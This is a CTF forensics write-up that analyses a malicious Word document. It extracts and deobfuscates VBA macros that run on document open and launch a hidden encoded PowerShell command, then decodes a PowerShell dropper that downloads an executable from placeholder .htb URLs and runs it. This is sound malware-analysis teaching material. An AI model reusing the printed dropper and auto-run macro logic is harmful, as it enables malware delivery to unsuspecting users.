# [emo](https://app.hackthebox.com/challenges/emo) Writeup -- w/ static analysis [HTB]
_Forensics_

## Introducing the document
HTB provides me with a Word document, so I immediately suspect macros will be involved.

The document contains just a simple image, nothing more. However, the character count tells me there are more than 65k characters, and only 12 words. Weird. I want to know more, so I run `strings` on the document.
```sh
$ strings emo.doc
bjbj@
"e1g"e1gp
][(s)]w][(s)]wP][(s)]wO][(s)]ww][(s)]we][(s)]wr][(s)]ws][(s)]wh][(s)]we][(s)]wL][(s)]wL][(s)]w ][(s)]w-][(s)]ww][(s)]wi][(s)]wn][(s)]wd][(s)]wo][(s)]ww][(s)]ws][(s)]wt][(s)]wy][(s)]wl][(s)]we][(s)]w ][(s)]wh][(s)]wi][(s)]wd][(s)]wd][(s)]we][(s)]wn][(s)]w ][(s)]w-][(s)]wE][(s)]wN][(s)]wC][(s)]wO][(s)]wD][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]w ][(s)]wIPA] ...
```
This huge `][(s)]w` thing goes on and on and on again, for more than 62k characters. I decide to name this little guy the "demon string", because simply looking at it hurts my brain. But well, at least now I know where that counter is coming from.

## Extracting the macros
This is the first time I look at MS Office macros, so I don't really know where to start. A few minutes (and a couple of Google searches) later, I discover [`oletools`](https://github.com/decalage2/oletools), an amazing weapon against Microsoft's most deranged creatures.

I start by collecting some general information about the file:
```sh
$ oleid emo.doc
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |MS Word 97-2003     |info      |                          
                    |Document or Template|          |                          
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Office    |info      |Application name declared 
                    |Word                |          |in properties             
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for        
                    |Western European    |          |properties                
                    |(Windows)           |          |                          
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA    
                    |                    |          |macros. Suspicious        
                    |                    |          |keywords were found. Use  
                    |                    |          |olevba and mraptor for    
                    |                    |          |more info.                
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.       
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```
I then run `olevba` to print the VBA macros. And well, it's a huge mess.
```sh
$ olevba emo.doc
-------------------------------------------------------------------------------
VBA MACRO Dw75ayd2hpcab6.cls 
in file: emo.doc - OLE stream: 'Macros/VBA/Dw75ayd2hpcab6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_open()
Get4ipjzmjfvp.X8twf_cydt6
End Sub
Function X4al3i4glox(Gav481k8nh28)
X4al3i4glox = Replace(Gav481k8nh28, "][(s)]w", Sxybmdt069cn)
End Function
-------------------------------------------------------------------------------
VBA MACRO Get4ipjzmjfvp.frm 
in file: emo.doc - OLE stream: 'Macros/VBA/Get4ipjzmjfvp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function X8twf_cydt6()
On Error Resume Next
sss = Dw75ayd2hpcab6.StoryRanges.Item(1)
   Dim LIHXDt(7 + 7 + 1 + 7) As String
Set XaXiEc = (iskkZI)
Dim SnQXASH(7 + 7 + 1 + 8) As String
LIHXDt(tBPnJI) = (Sin(1) + 205 + 6595)
aDLglIF = GXOghGA
LIHXDt(tBPnJI + tBPnJI) = (aOTNpGFFJ + 5)

[...]
```
There are more than 400 lines of obfuscated VBA. And I have absolutely no idea on how any of them works.

## "Replace" vs the demon string
I decide to go easy on myself, and I begin with the shortest function I can find:
```vb
Function X4al3i4glox(Gav481k8nh28)
X4al3i4glox = Replace(Gav481k8nh28, "][(s)]w", Sxybmdt069cn)
End Function
```
The first two things I learn are:
- the return variable of a function has the same name of that function;
- whenever a variable is referenced before assignment, its content is an empty string.

Therefore, function `X4al3i4glox` is simply taking a string and remove all occurrences of "][(s)]w".
```vb
Function REPLACE_WRAPPER(string)
    REPLACE_WRAPPER = Replace(string, "][(s)]w", "")
End Function
```
This makes me think about my dearest demon string. I copy-paste it into a file and remove every "][(s)]w", obtaining yet another weird creature.

```sh
POwersheLL -windowstyle hidden -ENCOD                 IPAABYTKAYFzYXApIyAdAxgDAfDLArAVeDgGBuYtAHCyAwAYKTAzBdbTAuFxQuAVeaQvBkQeAYGuUgAxXmQCAkoPArCsIgANeMwnAlynAWHd0IAZebwQAjwhAfHN0hAreVwWAC0XApHK0bARekwmAOzlAbHV0yAXeqwbAYxCAqHU0cAHIXglAitVAmGLYfAaIMAgASnWApGrUNAlJQwwAksDAlCxcbACcfgHBtFpAKEOMmAUdXAwBLvZAQHkIYAcWUQDARnlACCxwFAlJjwFBzzFAeFRkLATcgwUBb0eAgCYcIAyLbAKADnWAtCF4XAaStQxBHPyAnCe4CAtZpAOBtJuAxCdcDALLJAFAmngArED0pAyJwwqAHpsAvCuA...
```
However, this time I'm not scared, as this looks just another base 64 script. I try to decode it, but without success. After all, the encoded portion of this powershell command goes on for 18k characters. There should be something missing.

## Deobfuscating the macros
Since my "replace" approach failed, I suppose the only thing left to do is deobfuscating the macros. To do so, I use the following criteria:
1. Determine how many functions a function calls, and how many times it is called. Delete the functions that are never called, then start from the shortest and simplest function.
2. For each function, find the return value, and backtrack from there. If a variable appears in the computation of the return value, see how it's computed. Discard everything else.
3. Ignore every variable whose name appears only once.
4. Explicit string values.
5. When everything starts to make sense, *__rename!!__*

After some time, the VBA code looks like this:
```vb
----------------------------------------------------------------
VBA MACRO Dw75ayd2hpcab6.cls 
in file: emo.doc - OLE stream: 'Macros/VBA/Dw75ayd2hpcab6'
----------------------------------------------------------------
Private Sub Document_open()
    Get4ipjzmjfvp.MAIN
End Sub

Function REPLACE_WRAPPER(string)
    REPLACE_WRAPPER = Replace(string, "][(s)]w", "")
End Function

----------------------------------------------------------------
VBA MACRO Get4ipjzmjfvp.frm 
in file: emo.doc - OLE stream: 'Macros/VBA/Get4ipjzmjfvp'
----------------------------------------------------------------
' called when the document is opened
Function MAIN()
    On Error Resume Next
    'get some document content (TODO)
    sss = Dw75ayd2hpcab6.StoryRanges.Item(1)

    p1 = "][(s)]wro][(s)]w][(s)]wce][(s)]ws][(s)]ws][(s)]w" + ""
    p2 = "][(s)]w][(s)]w:][(s)]ww][(s)]win][(s)]w][(s)]w3][(s)]w2][(s)]w_][(s)]w" + ""
    p3 = "][(s)]w][(s)]ww][(s)]wi][(s)]wnm][(s)]w][(s)]wgm][(s)]wt][(s)]w][(s)]w" + ""
    S = ChrW(wdKeyS)   'S
    string = p3 + S + p2 + Get4ipjzmjfvp.Fwder3b7t4tqrecw + p1
    'string = ][(s)]w][(s)]ww][(s)]wi][(s)]wnm][(s)]w][(s)]wgm][(s)]wt][(s)]w][(s)]wS][(s)]w][(s)]w:][(s)]ww][(s)]win][(s)]w][(s)]w3][(s)]w2][(s)]w_][(s)]w][(s)]wP][(s)]w][(s)]wro][(s)]w][(s)]wce][(s)]ws][(s)]ws][(s)]w
    replaced_str = REPLACE(string)
    'replaced_str = winmgmtS:win32_Process
    Set win32_Process = CreateObject(replaced_str)
    cut_sss = Mid(sss, 5, Len(sss))
    'cut_sss = sss[4:]
    string = "" + replaced_str + S + Get4ipjzmjfvp.Mvskm12if9c843w3 + Get4ipjzmjfvp.Cn8r2cg8i626ztt
    'string = winmgmtS:win32_ProcessS][(s)]wtar][(s)]w][(s)]wtu][(s)]w

    'call CREATE_AND_HIDE(winmgmtS:win32_ProcessS][(s)]wtar][(s)]w][(s)]wtu][(s)]w][(s)]wP][(s)]w)
    'it would be winmgmtS:win32_ProcessStartuP, but replace is not called idk
    Set Created_obj = CREATE_AND_HIDE(string + Get4ipjzmjfvp.Fwder3b7t4tqrecw)
    win32_Process. _
    Create CUT_AND_PASTE(REPLACE(cut_sss)), "", Created_obj
End Function

' calls FN_CREATEOBJ and set sizes to 0 (hides the window)
Function CREATE_AND_HIDE(progr_id_2)
    On Error Resume Next
    Set CREATE_AND_HIDE = Rk3572j7tam4v8.FN_CREATEOBJ(REPLACE("" + progr_id_2 + ""))
    CREATE_AND_HIDE.XSize = 0
    CREATE_AND_HIDE.YSize = 0
End Function

' simply calles REPLACE on its argument
Function REPLACE(string)
    On Error Resume Next
    _string_ = (string)
    replaced_str = Dw75ayd2hpcab6.REPLACE_WRAPPER(_string_)
    REPLACE = replaced_str
End Function

'CUT_AND_PASTE = string[0:50] + string[50::2]
Function CUT_AND_PASTE(string)
    On Error Resume Next
    'extracts a substring from a string
    'Mid(string, start, [length])
    'CUT_AND_PASTE = string[0:50]
    CUT_AND_PASTE = Mid(string, 1, 50)
    'for (i = 51; i < len(str4); i += 2)
    For i = 51 To Len(string) Step 2
    'CUT_AND_PASTE += string[i] 
    CUT_AND_PASTE = CUT_AND_PASTE & Mid(string, i, 1)
    Next i
End Function

----------------------------------------------------------------
VBA MACRO Rk3572j7tam4v8.bas 
in file: emo.doc - OLE stream: 'Macros/VBA/Rk3572j7tam4v8'
---------------------------------------------------------------- 
Function FN_CREATEOBJ(Program_ID)
    On Error Resume Next
    Set FN_CREATEOBJ = CreateObject(Program_ID)
End Function
```
Much more readable, right? The only issue is, I don't know what the mysterious `sss` will contain. It's the only puzzle piece that I miss.

According to the Internet, `StoryRanges.Item` is used to fetch the content of the document. I'm not sure what it could return in this case, but I have my theories.

## Anatomy of a `sss`tring
Let's analyze what `sss` is going through in the `MAIN` function.
```vb
'1. initialize with document content
sss = Dw75ayd2hpcab6.StoryRanges.Item(1)
'2. cut the first 4 characters
cut_sss = Mid(sss, 5, Len(sss))
'3. remove the ][(s)]w
'4. select replaced_sss[0:50] + replaced_sss[50::2]
'5. run the thing
Create CUT_AND_PASTE(REPLACE(cut_sss)), "", Created_obj
```
So, from this code, I know that:
1. `sss` comes from the document content; the document contains 12 words and 65k characters;
2. `sss` contains at least one instance of "][(s)]w" for obfuscation reasons;
3. `sss` must contain some kind of code, since it's run later on;
4. `sss` must be processed by `CUT_AND_PASTE` _before_ it's runnable; `CUT_AND_PASTE` keeps the first 50 characters, and then 1 character out of 2;

Now, let's look at my demon string once more:
1. The demon string likely _is_ 95% of the document content (it's 62k character long);
2. The demon string contains a bunch of "][(s)]w";
3. Once removed, the demon string invokes the powershell, but the encoded portion cannot be decoded yet;
4. The first 50 characters of the demon string contains `POwersheLL -windowstyle hidden -ENCOD`; the following characters are the obfuscated base 64 string.

Given how everything ties up so nicely, I have reason to believe that `sss` is (or better, _contains_) the demon string. 
I know they are not exactly the same because `sss` undergoes a cut of the first 4 characters, which wouldn't make sense for the demon string (it directly starts with "POwershell"; changing it to "rshell" doesn't look productive to me).

And so it goes, I unraveled the mystery of the demon string base 64 portion: I simply need to consider 1 character out of 2, and then decode them. I still don't know whether I have to start with keeping or with removing the character, because of all the "`sss` and the demon string are not exactly the same" deduction. 

I can try both the options, so it doesn't really matter.
```py
import base64

command='IPAABYTKAYFzYXApIyAdAxgDAfDLArAVeDgGBuYtAHCyAwAYKTAzBdbTAuFxQuAVeaQvBkQeAYGuUgAxXmQCAkoPArCsIgANeMwnAlynAWHd0IAZebwQAjwhAfHN0hAreVwWAC0XApHK0bARekwmAOzlAbHV0yAXeqwbAYxCAqHU0cAHIXglAitVAmGLYfAaIMAgASnWApGrUNAlJQwwAksDAlCxcbACcfgHBtFpAKEOMmAUdXAwBLvZAQHkIYAcWUQDARnlACCxwFAlJjwFBzzFAeFRkLATcgwUBb0eAgCYcIAyLbAKADnWAtCF4XAaStQxBHPyAnCe4CAtZpAOBtJuAxCdcDALLJAFAmngArED0pAyJwwqAHpsAvCuA...'
try:
    # start with keeping
    encoded = command[::2]
    decoded = base64.b64decode(encoded)
    print('Started with keeping')
except:
    # start with removing
    encoded = command[1::2]
    decoded = base64.b64decode(encoded)
    print('Started with removing')

for b in decoded:
    if b != '\x00':
        print(chr(b), end='')
print()
```
Sure enough, I get some code! There is only one problem: it's obfuscated.

_Again._

```ps
SV  0zX ([TyPe]("{2}{0}{4}{3}{1}"-f 'e','rECtorY','sYst','.IO.dI','M')  ) ;   set  TxySeo  (  [TYpe]("{0}{7}{5}{6}{4}{2}{1}{8}{3}"-F'SYsTE','TM','IN','ER','pO','NeT.se','RVICE','M.','ANaG')) ;  $Nbf5tg3=('B9'+'yp'+('90'+'s'));$Vxnlre0=$Cludkjx + [char](64) + $R6r1tuy;$Ky3q0e8=(('Rq'+'dx')+'wo'+'5');  (  Dir  vaRiAble:0Zx).valuE::"CreAT`E`dIREc`T`OrY"($HOME + ((('nDp'+'Jrb')+('e'+'vk4n')+'D'+'p'+('C'+'cwr_2h')+'nD'+'p') -RePlAcE ('n'+'Dp'),[cHaR]92));$FN5ggmsH = (182,187,229,146,231,177,151,149,166);$Pyozgeo=(('J5f'+'y1')+'c'+'c');

[...]
```
## Deobfuscating the powershell code
I have a strange feeling of déjà vu, as I search on Google for a powershell deobfuscator. Javascript has dozens of them, so I have high hopes. However, I cannot find any of them, so I start doing it manually.

Again, I know _nothing_ about powershell code, so it takes me some time to understand how it works. I will write here some guidelines for future me:
- Semicolons separate instructions (like in Bash);
- Put everything in lower case, and remove "\`": this is very important to rename variables and improve readability. Sure, it could happen that some function names become wrong, but it's fine since I will not run the code anyway, and I still understand what they do.
- Remove variables that are never used.
- Every time there is an ugly string with a bunch of concatenations and parenthesis, just copy-paste it and print it in Python, it's not worth my time;
- These horrible formats (`"{2}{0}{4}{3}{1}" -f 'e','rECtorY','sYst','.IO.dI','M'`) work as follows. <br>
`{2}` means I start with the string at index 2 so, in this case, `'sYst'`; <br>
`{0}` means the string at index 0 follows, `'e'`; <br>
Continue until you get something that makes sense, in this example `sYsteM.IO.dIrECtorY`.

In the end, this is what the code looks like:
```ps1
$DirectoryType = [System.IO.Directory]
$ServicePointManagerType = [System.Net.ServicePointManager]
($DirectoryType).CreateDirectory($HOME + 'nDpJrb' + 'evk4nDpCcwr_2hnDp' -replace 'nDp', [char]92)
# [char]92 is \
# this becomes : ($DirectoryType).CreateDirectory($HOME + '\Jrbevk4\Ccwr_2h\')
$sus_array = (182,187,229,146,231,177,151,149,166)
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$sus_array += (186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228)
$Ale7g_8 = 'Ale7g_8'
$exe_full_path = $HOME + ('5tfJrbevk45tfCcwr_2h5tf' -replace '5tf',[char]92) + $Ale7g_8 + '.exe'
# this becomes : $exe_full_path = $HOME + '\Jrbevk4\Ccwr_2h\Ale7g_8.exe'
$sus_array += (185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139)
$conf_full_path = $HOME + ('5tfJrbevk45tfCcwr_2h5tf' -replace '5tf',[char]92) + $Ale7g_8 + '.conf'
# this becomes $conf_full_path = $HOME + '\Jrbevk4\Ccwr_2h\Ale7g_8.conf'
$web_client = &(new-object) Net.Webclient
$sus_array += (183,154,173,128,175,151,238,140,183,162,228,170,173,179,229)

$websites = ('http:][(s)]w][(s)]wda-industrial.htb][(s)]wjs][(s)]w9IdLP][(s)]w@http:][(s)]w][(s)]wdaprofesional.htb][(s)]wdata4][(s)]whWgWjTV][(s)]w@https:][(s)]w][(s)]wdagranitegiare.htb][(s)]wwp-admin][(s)]wtV][(s)]w@http:][(s)]w][(s)]wwww.outspokenvisions.htb][(s)]wwp-includes][(s)]waWoM][(s)]w@http:][(s)]w][(s)]wmobsouk.htb][(s)]wwp-includes][(s)]wUY30R][(s)]w@http:][(s)]w][(s)]wbiglaughs.htb][(s)]wsmallpotatoes][(s)]wY][(s)]w@https:][(s)]w][(s)]wngllogistics.htb][(s)]wadminer][(s)]wW3mkB][(s)]w').replace('][(s)]w',([array]('/'),('xwe'))[0]).split('@')
# ([array]('/'),('xwe'))[0]) is simply /, so we replace ][(s)]w with /
# overall, this becomes:
# $websites = (
#     'http://da-industrial.htb/js/9IdLP/',
#     'http://daprofesional.htb/data4/hWgWjTV/',
#     'https://dagranitegiare.htb/wp-admin/tV/',
#     'http://www.outspokenvisions.htb/wp-includes/aWoM/',
#     'http://mobsouk.htb/wp-includes/UY30R/',
#     'http://biglaughs.htb/smallpotatoes/Y/',
#     'https://ngllogistics.htb/adminer/W3mkB/'
# )
foreach ($website in $websites) { 
    try {
        $web_client.DownloadFile($website, $exe_full_path)
        If ((Get-Item $exe_full_path).Length -ge 45199) {
            $website.ToCharArray() | ForEach-Object { 
                $sus_array += ([byte][char]$_ -bxor 0xdf) 
            }
            $sus_array += (228)
            [Convert]::ToBase64String($sus_array) | Out-File -FilePath $conf_full_path
            $process = [wmiclass] 'win32_process'
            $process.Create($exe_full_path)
            break
        }
    } catch {}
}
```
## Finding the flag
These lines of code contain the flag, somewhere. I just need to find it.

First, I look at the websites. They all belong to the `htb` domain, which makes me think that do not exist, and are just placeholders for something much sketchier (in an actual malware).

Then, I focus on the `sus_array`. The reason I named it that way is that it looks like it contains some text. However, decoding it with any kind of character standard doesn't yield any result. I analyze the code better, until I spot this line:
```ps1
$sus_array += ([byte][char]$_ -bxor 0xdf)
``` 
It looks like it's been XOR encoded!

I run to Python and write a decoding script:
```py
sus_array = [182,187,229,146,231,177,151,149,166,186,141,228,182,177,171,229,236,239,239,239,228,181,182,171,229,234,239,239,228,185,179,190,184,229,151,139,157,164,235,177,239,171,183,236,141,128,187,235,134,128,158,177,176,139,183,154,173,128,175,151,238,140,183,162,228,170,173,179,229,228]
for c in sus_array:
    print(chr(c^223),end='')
print()
```
And finally, here is my flag!
```
id:M8nHJyeR;int:3000;jit:500;flag:HTB{XXX};url:;
```

## Read more!
[➡️ Next challenge: TrueSecrets](./truesecrets.md)
